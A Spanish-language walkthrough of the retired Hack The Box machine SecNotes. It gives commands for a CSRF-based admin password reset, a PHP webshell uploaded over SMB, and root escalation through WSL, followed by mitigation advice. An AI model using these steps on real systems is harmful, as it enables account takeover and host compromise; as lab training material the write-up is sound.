---
machine: SecNotes
os: Windows
difficulty: Medium
platform: Hack The Box
state: Retired
tags: [windows, web, csrf, smb, wsl, webshell]
---

# SecNotes — Hack The Box (Windows)

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de referencia; sin flags ni credenciales reales.

## TL;DR

La aplicación de notas permite registrar usuarios y tiene un formulario de contacto vulnerable a CSRF. Se cambia la contraseña del administrador, se accede a una nota con credenciales SMB y se escribe un webshell en `\\secnotes.htb\new-site`. La escalada usa `bash.exe` de WSL, que se ejecuta como root.

## Enumeración

```bash
nmap -p- --min-rate 5000 -T4 <IP>
nmap -sC -sV -p80,139,445,5985 <IP>
```

Se añade `secnotes.htb` al hosts. La web permite registrar una cuenta y crear notas. SMB muestra un recurso `new-site`.

```bash
smbclient -L //<IP> -N
```

## Acceso inicial

Se crea una cuenta y se revisa el formulario de contacto. No valida el token CSRF y permite cambiar parámetros ocultos. Se envía una petición para cambiar la contraseña del usuario `admin`:

```bash
curl -s -X POST http://secnotes.htb/contact.php \
  -b 'PHPSESSID=<SESSION>' \
  --data 'name=<NAME>&email=<EMAIL>&message=<MSG>&csrf_token=<TOKEN>&password=<NEW_PASS>'
```

Se inicia sesión como `admin` y se lee una nota con credenciales de SMB:

```text
\\secnotes.htb\new-site
<USER>:<PASS>
```

## Movimiento lateral

El recurso `new-site` es escribible. Se sube un webshell PHP y se ejecuta:

```bash
smbclient //secnotes.htb/new-site -U '<USER>%<PASS>'
put shell.php
```

```bash
curl 'http://secnotes.htb/new-site/shell.php?c=whoami'
```

Se obtiene una shell como `tyler`. Se enumeran usuarios y se busca la flag de usuario.

## Escalada a root

En el host hay WSL instalado. `bash.exe` se ejecuta como root por defecto:

```cmd
C:\Windows\System32\bash.exe -c "id"
# uid=0(root)
```

Desde esa shell se lee la flag de root. Se redacta.

## Evidencia

- Registro y petición CSRF con token redactado.
- Nota con credenciales SMB redactadas.
- `smbclient` y webshell.
- `bash.exe -c id` como root.

## Lecciones aprendidas

- Un formulario sin token CSRF puede cambiar la contraseña de un admin.
- Las notas de la aplicación pueden contener credenciales de otros servicios.
- Un recurso SMB escribible permite publicar un webshell.
- WSL mal configurado otorga root en el host.

## Mitigación y detección

- Implementar tokens CSRF y validar origen.
- No almacenar credenciales en notas.
- Restringir escritura en recursos SMB y ejecución de scripts.
- Limitar WSL y revisar `bash.exe` ejecutado por IIS/usuarios web.
- Detectar cambios de contraseña de admin y subidas PHP a SMB.

## Referencias

- <https://www.hackthebox.com/machines/secnotes>
- <https://owasp.org/www-community/attacks/csrf>
- <https://learn.microsoft.com/en-us/windows/wsl/>
